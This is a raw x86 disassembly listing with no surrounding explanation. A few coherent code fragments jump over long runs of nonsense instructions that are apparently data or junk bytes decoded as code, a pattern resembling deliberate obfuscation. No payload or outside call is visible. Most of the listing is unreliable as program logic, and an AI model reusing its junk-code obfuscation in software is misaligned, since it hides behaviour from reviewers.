  402136:	cmp    DWORD PTR [edx+0x4],0x1e
  40213a:	sub    dh,BYTE PTR [esi-0x3f]
  40213d:	icebp  
  40213e:	sbb    esi,eax
  402140:	jmp    0x808a774a
  402145:	or     BYTE PTR cs:[edi],0x7d
  402149:	sti    
  40214a:	xchg   esi,eax
  40214b:	sbb    al,0xda
  40214d:	xchg   ecx,eax
  40214e:	(bad)  
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	fild   QWORD PTR [esi+ebp*2]
  40216c:	addr16 push ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x40215b
  402176:	sub    DWORD PTR [ebx+0x14],esi
  402179:	mov    bl,0xef
  40217b:	lods   eax,DWORD PTR ds:[esi]
  40217c:	and    al,0x6b
  40217e:	fwait
  40217f:	jnp    0x402189
  402181:	dec    esi
  402182:	inc    ebp
  402183:	loop   0x40219a
  402185:	cmp    eax,0xf5663968
  40218a:	sbb    DWORD PTR [ebx+0x738fb066],0xffffff91
  402191:	sub    eax,0x975bbbcc
  402196:	loope  0x402130
  402198:	arpl   WORD PTR [ebx+eax*1],di
  40219b:	or     DWORD PTR [eax+0x39],ebp
  40219e:	inc    ebp
  40219f:	in     eax,0x27
  4021a1:	lahf   
  4021a2:	inc    ebx
  4021a3:	add    DWORD PTR [edx-0x4e82f93a],eax
  4021a9:	push   edi
  4021aa:	jb     0x4021b3
  4021ac:	push   eax
  4021ad:	sub    eax,0x127933c5
  4021b2:	out    0x54,eax
  4021b4:	push   edi
  4021b5:	shl    ah,0xbe
  4021b8:	mov    al,ds:0xee887664
  4021bd:	or     edx,DWORD PTR [si+0x77]
  4021c1:	in     ax,dx
  4021c3:	call   0x32137418
  4021c8:	fdiv   QWORD PTR [ecx+0x543d715c]
  4021ce:	adc    bl,0x24
  4021d1:	je     0x402188
  4021d3:	mov    cl,0xf5
  4021d5:	in     eax,dx
  4021d6:	jno    0x4021d9
  4021d8:	mov    ds:0x713d11ca,eax
  4021dd:	or     esp,DWORD PTR [edx]
  4021df:	test   al,0x1c
  4021e1:	retf   0xa519
  4021e4:	in     eax,0xd6
  4021e6:	aam    0x87
  4021e8:	xor    al,0x7
  4021ea:	sub    eax,0xdde6b5bf
  4021ef:	push   ebp
  4021f0:	push   esp
  4021f1:	dec    edx
  4021f2:	sub    ah,bh
  4021f4:	dec    esp
  4021f5:	push   ecx
  4021f6:	leave  
  4021f7:	push   ecx
  4021f9:	mov    edx,DWORD PTR [edi-0x363ee48c]
  4021ff:	sub    al,0xe8
  402201:	stos   DWORD PTR es:[edi],eax
  402202:	test   ch,0x4e
  402205:	cmc    
  402206:	pop    ss
  402207:	test   DWORD PTR [edi+0x2e],eax
  40220a:	jle    0x4021cb
  40220c:	jb     0x40227f
  40220e:	or     bl,BYTE PTR [edx]
  402210:	add    al,0x1d
  402212:	in     al,dx
  402213:	fwait
  402214:	mov    BYTE PTR [ebx+edi*2],ah
  402217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402218:	fisub  WORD PTR [eax]
  40221a:	lea    ebp,[esi+0x6815ed66]
  402220:	das    
  402221:	mov    ebp,0x95639d97
  402226:	sbb    edi,DWORD PTR [ecx]
  402228:	mov    bl,0xf7
  40222a:	sub    al,0x59
  40222c:	fs cmc 
  40222e:	add    edx,edx
  402230:	adc    BYTE PTR [edx],dl
  402232:	sbb    ebx,esp
  402234:	pop    edx
  402235:	arpl   WORD PTR [eax+0x649e44dc],ax
  40223b:	outs   dx,BYTE PTR ds:[esi]
  40223c:	push   ebp
  40223d:	sub    DWORD PTR [edi-0x796f4496],esi
  402243:	inc    edx
  402244:	nop
  402245:	adc    DWORD PTR [ecx+edi*2],edi
  402248:	ins    BYTE PTR es:[edi],dx
  402249:	mov    edx,0x27a2aa6a
  40224e:	sub    eax,0x81b4d7f0
  402253:	imul   edx,DWORD PTR [ebx+0x4042a076],0x73
  40225a:	cmp    DWORD PTR [esi],edi
  40225c:	icebp  
  40225d:	test   ch,0xe1
  402260:	xchg   ecx,eax
  402261:	ret    0x469d
  402264:	cld    
  402265:	jb     0x4021ff
  402267:	mov    WORD PTR gs:[ecx+0x388628e9],?
  40226e:	lods   eax,DWORD PTR ds:[esi]
  40226f:	jnp    0x40222b
  402271:	jnp    0x402288
  402273:	(bad)  
  402274:	jno    0x4022ea
  402276:	add    DWORD PTR [ecx+0x505176aa],eax
  40227c:	xchg   bh,ah
  40227e:	sub    DWORD PTR [edi-0x300ab39f],edx
  402284:	inc    ebx
  402285:	stc    
  402286:	pop    ebx
  402287:	pop    es
  402288:	pop    ds
  402289:	pop    es
  40228a:	popf   
  40228b:	and    BYTE PTR [edi+0x16],cl
  40228e:	xchg   ebx,eax
  40228f:	jecxz  0x40227c
  402291:	call   0x136f:0xaaf0129b
  402298:	push   ebx
  402299:	enter  0xdf76,0x19
  40229d:	xor    eax,0x7c2ced8d
  4022a2:	cmp    esi,DWORD PTR [edi-0x4c]
  4022a5:	ins    DWORD PTR es:[edi],dx
  4022a6:	test   eax,0xb5b2a53a
  4022ab:	inc    edx
  4022ac:	mov    ds:0xd46b7ac,al
  4022b1:	inc    esp
  4022b2:	xlat   BYTE PTR ds:[ebx]
  4022b3:	in     eax,dx
  4022b4:	inc    edi
  4022b5:	repz dec ebp
  4022b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022b8:	or     eax,0x4ff80de2
  4022bd:	dec    BYTE PTR [esi-0x6]
  4022c0:	fld    QWORD PTR [ebx]
  4022c2:	and    ch,BYTE PTR [ecx+0x38b7acec]
  4022c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022c9:	mov    esi,0x927e9901
  4022ce:	sub    al,0x89
  4022d0:	shl    esp,cl
  4022d2:	int3   
  4022d3:	mov    dh,0x5a
  4022d5:	cmp    DWORD PTR [edi-0x23],esi
  4022d8:	push   ebx
  4022d9:	xor    BYTE PTR [ecx],0x30
  4022dc:	mov    ds:0xd9ca671e,eax
  4022e1:	(bad)  
  4022e2:	shr    BYTE PTR [ecx+0x4ef087b0],1
  4022e8:	adc    dh,BYTE PTR [edi]
  4022ea:	jp     0x402288
  4022ec:	cmc    
  4022ed:	test   ebp,esi
  4022ef:	and    al,0x6a
  4022f1:	jno    0x402341
  4022f3:	das    
  4022f4:	or     cl,0x6
  4022f7:	xchg   DWORD PTR [ebx-0x17ba74b0],esi
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	sub    al,0x3f
  402359:	fadd   QWORD PTR [ebx]
  40235b:	call   0x7e7f:0xfa7e7e03
  402362:	jle    0x402303
  402364:	or     esi,ecx
  402366:	xchg   ebp,eax
  402367:	xchg   edx,eax
  402368:	je     0x40234f
  40236a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40236b:	pop    ebx
  40236c:	sbb    eax,0x3750d7f9
  402371:	adc    bh,dl
  402373:	ds jnp 0x40230f
  402376:	and    ah,BYTE PTR [edx]
  402378:	pusha  
  402379:	out    dx,eax
  40237a:	mov    WORD PTR [ebx],ss
  40237c:	push   eax
  40237d:	inc    esp
  40237e:	jnp    0x4023fa
  402380:	daa    
  402381:	mov    bh,0x48
  402383:	sub    BYTE PTR [edi],bh
  402385:	(bad)  
  402386:	push   esi
  402387:	or     ah,dl
  402389:	mov    eax,0xd29910a1
  40238e:	pop    esi
  40238f:	jle    0x402335
  402391:	std    
  402392:	loopne 0x402348
  402394:	jmp    0xbc4430c5
  402399:	jg     0x402373
  40239b:	xchg   ecx,eax
  40239c:	jp     0x402380
  40239e:	cmp    esp,DWORD PTR [edi+0x7b]
  4023a1:	push   esp
  4023a2:	push   cs
  4023a3:	test   eax,0x6e21a846
  4023a8:	leave  
  4023a9:	sub    al,0x3b
  4023ab:	pop    esp
  4023ac:	push   esp
  4023ad:	jmp    0x402339
  4023af:	pop    ss
  4023b0:	pop    es
  4023b1:	sub    bl,ch
  4023b3:	mov    ebp,0xe752de62
  4023b8:	into   
  4023b9:	lahf   
  4023ba:	in     eax,0xf8
  4023bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023bd:	pushf  
  4023be:	xchg   ecx,eax
  4023bf:	jmp    0x7a890bc5
  4023c4:	cli    
  4023c5:	out    dx,al
  4023c6:	sbb    al,0x5e
  4023c8:	jg     0x4023e3
  4023ca:	fsub   st,st(2)
  4023cc:	inc    ecx
  4023cd:	gs push ebx
  4023cf:	data16 cmc 
  4023d1:	lahf   
  4023d2:	or     ch,BYTE PTR [eax]
  4023d4:	inc    ecx
  4023d5:	repz push ebp
  4023d7:	mov    dl,0x31
  4023d9:	mov    ah,0xad
  4023db:	cmp    DWORD PTR [esi+0x3a3dd2f9],0xffffffc2
  4023e2:	imul   edx,DWORD PTR cs:[eax+0x49],0xc2c9596e
  4023ea:	xchg   esp,eax
  4023eb:	(bad)  [ebx+0x7efe79c0]
  4023f1:	pop    es
  4023f2:	mov    ah,0xb1
  4023f4:	inc    ebp
  4023f5:	mov    cl,0x32
  4023f7:	mov    eax,0x3572c24a
  4023fc:	psrlw  mm6,QWORD PTR [esi+0x4287d7e4]
  402403:	pop    eax
  402404:	xchg   ecx,eax
  402405:	and    eax,0x53ee52a4
  40240a:	and    eax,0x1e26e208
  40240f:	push   ds
  402410:	lods   eax,DWORD PTR ds:[esi]
  402411:	or     bh,BYTE PTR [ebp+0x35585873]
  402417:	out    dx,al
  402418:	int3   
  402419:	mov    edi,0xb5de3ea3
  40241e:	sbb    DWORD PTR [ecx],edi
  402420:	dec    esi
  402421:	test   al,0x89
  402423:	nop
  402424:	lods   al,BYTE PTR ds:[esi]
  402425:	je     0x402440
  402427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402428:	inc    eax
  402429:	cmp    edx,DWORD PTR [eax+0x32]
  40242c:	shr    DWORD PTR [eax+ebx*2],cl
  40242f:	sub    esi,edx
  402431:	push   ss
  402432:	in     al,0xc8
  402434:	(bad)  [ecx+0x57]
  402437:	pop    ecx
  402438:	jne    0x40240b
  40243a:	sub    BYTE PTR [ebx],0x59
  40243d:	xchg   esi,eax
  40243e:	xchg   ebx,eax
  40243f:	jmp    0xf5d26060
  402444:	pop    ss
  402445:	inc    eax
  402446:	sbb    edx,DWORD PTR [eax-0x4cbd6e66]
  40244c:	mov    eax,0x5c7e0cf5
  402451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402452:	push   ds
  402453:	mov    ebp,0xfc1a8d6d
  402458:	aad    0x95
  40245a:	icebp  
  40245b:	imul   ebx,DWORD PTR ds:0xe05e35ef,0xffffffbd
  402462:	mov    ecx,0x5c7ee2d5
  402467:	cmp    esp,ebp
  402469:	ror    BYTE PTR [eax+edi*4],cl
  40246c:	push   ecx
  40246d:	cmp    BYTE PTR [esi-0x768ac038],cl
  402473:	dec    edi
  402474:	popf   
  402475:	mov    eax,ds:0x8fdbf557
  40247a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40247b:	(bad)  
  40247c:	xchg   ecx,eax
  40247d:	into   
  40247e:	out    0xe5,eax
  402480:	push   ebx
  402481:	xchg   edi,eax
  402482:	lock enter 0xb0ee,0x0
  402487:	sbb    al,0xfc
  402489:	pop    ebp
  40248a:	sbb    esi,edi
  40248c:	jecxz  0x402480
  40248e:	mov    WORD PTR [ebp+0x66],?
  402491:	xor    eax,0xdb6d0148
  402496:	and    edx,ecx
  402498:	pop    ss
  402499:	dec    esi
  40249a:	or     eax,0xa7d870ad
  40249f:	mov    cs,WORD PTR [ebp-0x77b6fea3]
  4024a5:	sbb    edx,DWORD PTR [ecx+ebp*1-0x173ea4e5]
  4024ac:	je     0x402506
  4024ae:	inc    edi
  4024af:	jns    0x402476
  4024b1:	or     al,0xc7
  4024b3:	add    DWORD PTR [eax+0x5007445b],ecx
  4024b9:	int3   
  4024ba:	aas    
  4024bb:	mov    bh,0x72
  4024bd:	in     eax,0x91
  4024bf:	int    0x64
  4024c1:	loope  0x40245c
  4024c3:	lock jp 0x4024fa
  4024c6:	push   esp
  4024c7:	dec    edi
  4024c8:	adc    ecx,DWORD PTR [edi+ebp*8-0x6c]
  4024cc:	fdiv   DWORD PTR [edx+0xabd7453]
  4024d2:	inc    cl
  4024d4:	adc    DWORD PTR [ecx-0x20],esi
  4024d7:	push   edx
  4024d8:	fs dec esi
  4024da:	sbb    BYTE PTR [esp+ecx*4-0x9],al
  4024de:	in     eax,dx
  4024df:	loope  0x4024e3
  4024e1:	pop    ebp
  4024e2:	push   cs
  4024e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024e4:	push   ss
  4024e5:	mov    ah,0x90
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	(bad)  
  40250e:	sar    DWORD PTR [edx+0x1e],cl
  402511:	add    DWORD PTR es:[esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40252f
  40251a:	outs   dx,BYTE PTR ds:[esi]
  40251b:	sub    al,0x8c
  40251d:	jge    0x402594
  40251f:	bound  ecx,QWORD PTR [ebx]
  402521:	ins    DWORD PTR es:[edi],dx
  402522:	jb     0x402593
  402524:	add    ch,al
  402526:	mov    dh,0x48
  402528:	mov    esp,0xed8c02a
  40252d:	dec    ebx
  40252e:	test   eax,0xcf3c4157
  402533:	fist   WORD PTR [esi-0x5b377b2]
  402539:	mov    cl,0x6
  40253b:	adc    dl,bl
  40253d:	push   0xffffff8d
  40253f:	inc    esp
  402540:	idiv   BYTE PTR [edi+esi*2-0x39]
  402544:	ins    BYTE PTR es:[edi],dx
  402545:	dec    ecx
  402546:	sub    edx,ebp
  402548:	je     0x40252c
  40254a:	add    bh,BYTE PTR [ebx+0x3f4401c]
  402550:	aad    0x6a
  402552:	mov    al,0xa0
  402554:	in     eax,dx
  402555:	cmp    DWORD PTR [esi-0x79],ebp
  402558:	int    0x52
  40255a:	mov    esp,0x9d2d2f7
  40255f:	mov    ds:0x7fa29a72,eax
  402564:	sbb    al,0xdc
  402566:	pop    ss
  402567:	nop
  402568:	dec    esp
  402569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256a:	jecxz  0x402563
  40256c:	out    0x73,al
  40256e:	mov    al,0x1c
  402570:	(bad)  
  402571:	in     eax,dx
  402572:	mov    esp,0x9f559127
  402577:	dec    edi
  402578:	in     eax,0x78
  40257a:	lods   al,BYTE PTR ds:[esi]
  40257b:	sub    bh,BYTE PTR [ecx-0x70]
  40257e:	dec    ebp
  40257f:	sub    bl,al
  402581:	cld    
  402582:	imul   edx,ebp,0x20
  402585:	fyl2x  
  402587:	cwde   
  402588:	jo     0x4025ae
  40258a:	jae    0x40251d
  40258c:	jle    0x402514
  40258e:	add    DWORD PTR [edx+edi*4-0x12],esp
  402592:	int3   
  402593:	adc    bh,BYTE PTR [edi]
  402595:	cmp    esi,esi
  402597:	pop    eax
  402598:	pop    edx
  402599:	out    dx,al
  40259a:	out    0xf,al
  40259c:	mov    edi,0x70d49a15
  4025a1:	dec    edx
  4025a2:	cli    
  4025a3:	adc    ah,ch
  4025a5:	add    al,0x72
  4025a7:	pop    es
  4025a8:	ror    dl,1
  4025aa:	inc    edi
  4025ab:	pop    ss
  4025ac:	pop    esi
  4025ad:	mov    esp,ss
  4025af:	out    0x73,al
  4025b1:	xor    al,0xbc
  4025b3:	add    BYTE PTR [ebx],ch
  4025b5:	(bad)  
  4025b6:	xchg   esp,eax
  4025b7:	out    0x6d,eax
  4025b9:	sahf   
  4025ba:	sub    eax,DWORD PTR ds:0x6838284f
  4025c0:	aas    
  4025c1:	inc    ecx
  4025c2:	mov    eax,0xebfc4f06
  4025c7:	nop
  4025c8:	sbb    al,0xb5
  4025ca:	stos   DWORD PTR es:[edi],eax
  4025cb:	fwait
  4025cc:	psubusw mm1,mm5
  4025cf:	into   
  4025d0:	sbb    BYTE PTR [ebp-0x582d365a],0xc8
  4025d7:	jbe    0x4025ab
  4025d9:	sub    eax,0xcc1adc17
  4025de:	enter  0x781,0x5d
  4025e2:	(bad)  
  4025e4:	popa   
  4025e5:	push   ss
  4025e6:	test   BYTE PTR [edi],cl
  4025e8:	sbb    ecx,edx
  4025ea:	std    
  4025eb:	push   ebp
  4025ec:	inc    esi
  4025ed:	mov    eax,ds:0xf492d9e1
  4025f2:	mov    esp,0x1fd61dca
  4025f7:	mov    cl,ah
  4025f9:	fisub  DWORD PTR [ebx+0x47]
  4025fc:	call   0xcb6cd464
  402601:	xor    BYTE PTR [edx-0x38],al
  402604:	stos   DWORD PTR es:[edi],eax
  402605:	push   ecx
  402606:	pop    esi
  402607:	mov    ebp,0x670f1e31
  40260c:	ret    
  40260d:	jle    0x40260a
  40260f:	xor    esp,DWORD PTR [esi-0x5d8ffced]
  402615:	push   esi
  402616:	popf   
  402617:	xlat   BYTE PTR ds:[ebx]
  402618:	ds or  eax,ecx
  40261b:	pop    esi
  40261c:	dec    esi
  40261d:	aad    0x76
  40261f:	or     edi,DWORD PTR [ebp+0x50]
  402622:	or     bh,BYTE PTR [ebp+0x43608faf]
  402628:	inc    edx
  402629:	dec    eax
  40262a:	xchg   ebp,eax
  40262b:	cmp    eax,0x8b879f6d
  402630:	shl    DWORD PTR [ecx],cl
  402632:	ja     0x40264f
  402634:	mov    al,0xa3
  402636:	ins    DWORD PTR es:[edi],dx
  402637:	lods   eax,DWORD PTR ds:[esi]
  402638:	pop    ebp
  402639:	test   BYTE PTR [eax-0x25],dh
  40263c:	jmp    0x402627
  40263e:	lahf   
  40263f:	or     eax,0x13a9ca65
  402644:	jg     0x4026a8
  402646:	pop    ebp
  402647:	pushf  
  402648:	pop    ds
  402649:	scas   eax,DWORD PTR es:[edi]
  40264a:	in     eax,0x66
  40264c:	mov    eax,0x86286409
  402651:	xchg   ecx,eax
  402652:	push   ebx
  402653:	push   ecx
  402654:	and    BYTE PTR [ebx+edx*8-0x48],0xa3
  402659:	push   ds
  40265a:	mov    WORD PTR [eax-0x3eae0629],gs
  402660:	test   edx,eax
  402662:	(bad)  
  402663:	jo     0x402624
  402665:	xor    eax,0x19087257
  40266a:	in     al,dx
  40266b:	cmp    ch,bl
  40266d:	xchg   BYTE PTR [edi-0x34],dh
  402670:	pop    esp
  402671:	sub    al,0xb4
  402673:	popf   
  402674:	mov    ebx,0x484707c
  402679:	dec    esp
  40267a:	cmp    al,BYTE PTR [ebx+0x76]
  40267d:	push   ss
  40267e:	push   ebp
  40267f:	mov    eax,0x16fb5f87
  402684:	add    edi,edi
  402686:	aad    0xcf
  402688:	push   0xffffffc1
  40268a:	xchg   ecx,eax
  40268b:	sbb    al,0xdd
  40268d:	cli    
  40268e:	lahf   
  40268f:	mov    ecx,ecx
  402691:	cmp    eax,0x3c626ef6
  402696:	shr    edx,0xe7
  402699:	in     eax,dx
  40269a:	adc    bh,BYTE PTR [ecx+0xd]
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	dec    ecx
  4026d3:	arpl   cx,ax
  4026d5:	jns    0x402679
  4026d7:	push   cs
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026b7
  4026df:	fsubr  QWORD PTR [edx+0x18da112f]
  4026e5:	add    edx,DWORD PTR gs:[ecx]
  4026e8:	repnz aad 0x76
  4026eb:	xchg   esp,eax
  4026ec:	push   edi
  4026ed:	push   0x70
  4026ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026f0:	jecxz  0x402699
  4026f2:	sbb    DWORD PTR [eax-0x73],ebp
  4026f5:	das    
  4026f6:	adc    eax,0xa90f72ae
  4026fb:	call   DWORD PTR [edi]
  4026fd:	add    eax,0xb159294e
  402702:	push   eax
  402703:	sub    dh,BYTE PTR [ebp+ebx*2-0x53]
  402707:	or     BYTE PTR [eax-0x7c],dl
  40270a:	add    al,0x97
  40270c:	and    cl,BYTE PTR [edx+0x4f]
  40270f:	js     0x40269b
  402711:	outs   dx,DWORD PTR ds:[esi]
  402712:	sub    dl,dl
  402714:	add    dl,BYTE PTR [edi]
  402716:	fistp  WORD PTR [eax-0x27]
  402719:	add    al,0x6a
  40271b:	xor    al,0xab
  40271d:	adc    BYTE PTR cs:[eax],0x7f
  402721:	mov    ds:0x91d93c12,al
  402726:	test   al,ch
  402728:	cld    
  402729:	mov    edi,0x323d116a
  40272e:	mov    esp,0xa0a0b5d3
  402733:	mov    ebp,0xf95ae356
  402738:	daa    
  402739:	pop    esi
  40273a:	dec    eax
  40273b:	mov    BYTE PTR [esi+ecx*1-0x2905febb],dh
  402742:	mov    al,ds:0x4c590006
  402747:	sub    eax,0x18a5f028
  40274c:	mov    eax,ds:0xbe28c28
  402751:	or     eax,DWORD PTR [ebx]
  402753:	mov    WORD PTR [edi-0x64],es
  402756:	es pop ebp
  402758:	add    al,0x2a
  40275a:	xchg   ecx,eax
  40275b:	ins    DWORD PTR es:[edi],dx
  40275c:	rcr    BYTE PTR [esi],cl
  40275e:	outs   dx,BYTE PTR ds:[esi]
  40275f:	in     al,dx
  402760:	add    ah,0x7f
  402763:	in     al,0x8a
  402765:	jmp    0x402759
  402767:	dec    ebp
  402768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402769:	(bad)  
  40276a:	sbb    eax,0x60571b53
  40276f:	stos   DWORD PTR es:[edi],eax
  402770:	mov    cl,0xcb
  402772:	xlat   BYTE PTR ds:[ebx]
  402773:	jmp    0x59b0:0x3ebdde82
  40277a:	adc    eax,0xeb73f99d
  40277f:	mov    eax,0x88903890
  402784:	jg     0x40276f
  402786:	fdivr  st,st(5)
  402788:	dec    esi
  402789:	pop    esp
  40278a:	stc    
  40278b:	cli    
  40278c:	push   edi
  40278d:	test   BYTE PTR [ecx],bl
  40278f:	inc    ebx
  402790:	mov    dl,0x72
  402792:	ins    DWORD PTR es:[edi],dx
  402793:	aas    
  402794:	imul   ebx,DWORD PTR [esi],0x2bb9717b
  40279a:	ret    0xd2df
  40279d:	inc    edx
  40279e:	push   esi
  40279f:	add    BYTE PTR [edi+0x410764],dl
  4027a5:	inc    edx
  4027a6:	ret    0x4b13
  4027a9:	aam    0x46
  4027ab:	jmp    0x8b796d02
  4027b0:	mul    BYTE PTR [esi-0x50]
  4027b3:	in     al,0xc4
  4027b5:	or     BYTE PTR [ebx],cl
  4027b7:	fs in  al,0xcb
  4027ba:	mov    ebp,0x545dd392
  4027bf:	rcr    DWORD PTR [eax+0x22ed79ad],0xa5
  4027c6:	stc    
  4027c7:	mov    WORD PTR [eax+edi*4+0x2b],?
  4027cb:	stc    
  4027cc:	lods   eax,DWORD PTR ds:[esi]
  4027cd:	repz ds ret 
  4027d0:	pop    es
  4027d1:	xchg   ecx,eax
  4027d2:	add    DWORD PTR [ebp-0x4abd60cc],ebp
  4027d8:	xor    esi,eax
  4027da:	popa   
  4027db:	loopne 0x4027c4
  4027dd:	jge    0x40278b
  4027df:	jae    0x402829
  4027e1:	mov    esp,0xff4ddc7
  4027e6:	outs   dx,DWORD PTR ds:[esi]
  4027e7:	gs jnp 0x4027a5
  4027ea:	adc    DWORD PTR [ecx+0x591ab283],eax
  4027f0:	test   al,0xc8
  4027f2:	adc    eax,0xc4ec5383
  4027f7:	sti    
  4027f8:	lds    esp,FWORD PTR [ecx]
  4027fa:	pop    esi
  4027fb:	jne    0x4027f5
  4027fd:	cmp    edx,DWORD PTR [esi+eiz*1-0x7f]
  402801:	jo     0x4027cb
  402803:	into   
  402804:	loopne 0x4027ce
  402806:	inc    ebx
  402807:	xchg   BYTE PTR [ebx],bh
  402809:	aaa    
  40280a:	adc    eax,0xe7751c20
  40280f:	inc    esp
  402810:	sbb    esp,edx
  402812:	into   
  402813:	std    
  402814:	adc    DWORD PTR [eax-0x79],eax
  402817:	pushf  
  402818:	ins    DWORD PTR es:[edi],dx
  402819:	xor    DWORD PTR [ebx+0x4c],ebx
  40281c:	add    al,dh
  40281e:	mov    ecx,DWORD PTR ds:0x704354e
  402824:	mov    DWORD PTR [eax-0x124d0cd1],edi
  40282a:	addr16 pop ebp
  40282c:	loop   0x4028a4
  40282e:	iret   
  40282f:	std    
  402830:	daa    
  402831:	mov    DWORD PTR [edi-0x60],ecx
  402834:	xchg   ebp,eax
  402835:	adc    dl,BYTE PTR [ebp+eax*1-0x5]
  402839:	popf   
  40283a:	out    0xdc,eax
  40283c:	inc    edx
  40283d:	retf   
  40283e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40283f:	and    DWORD PTR [eax-0x9],esi
  402842:	fwait
  402843:	jne    0x4028ac
  402845:	mov    bl,0xcd
  402847:	xor    DWORD PTR [ebx+0x2466f54a],esi
  40284d:	loopne 0x402833
  40284f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402850:	nop
  402851:	rcl    DWORD PTR ds:[edi],0xea
  402855:	and    WORD PTR [ebx-0x2d],0xffc7
  40285a:	cmp    ch,BYTE PTR [ebx]
  40285c:	fdivr  st,st(5)
  40285e:	adc    dl,BYTE PTR [eax]
  402860:	dec    eax
  402861:	ror    DWORD PTR [ebx+0x4d8bd045],1
  402867:	clc    
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	imul   edx,DWORD PTR [esi-0x15],0xffffffe0
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x40290d
  402890:	pusha  
  402891:	pop    eax
  402892:	out    0xc9,eax
  402894:	xlat   BYTE PTR ds:[ebx]
  402895:	mov    dh,0xc2
  402897:	sub    al,0xfd
  402899:	or     BYTE PTR [ecx-0x27306dde],0xc9
  4028a0:	out    0xb6,eax
  4028a2:	fld    DWORD PTR [eax+ecx*4-0x64cc3282]
  4028a9:	or     al,0x52
  4028ab:	leave  
  4028ac:	ret    
  4028ad:	cmp    BYTE PTR [ecx+0x35770948],cl
  4028b3:	retf   
  4028b4:	loope  0x4028ec
  4028b6:	and    al,0xcf
  4028b8:	sbb    al,0x57
  4028ba:	mov    al,ds:0x9545e53
  4028bf:	shr    BYTE PTR [edx-0x7f805a1f],0x84
  4028c6:	mov    ah,0x14
  4028c8:	xor    ecx,ecx
  4028ca:	xor    ebp,DWORD PTR [edi]
  4028cc:	xchg   BYTE PTR [edx-0x6d],dl
  4028cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d0:	pop    ebp
  4028d1:	pop    ss
  4028d2:	inc    ecx
  4028d3:	jmp    0xc9e2:0xfdda7e28
  4028da:	adc    eax,0x151ae7d7
  4028df:	xor    eax,0x4d2f730e
  4028e4:	loopne 0x40288e
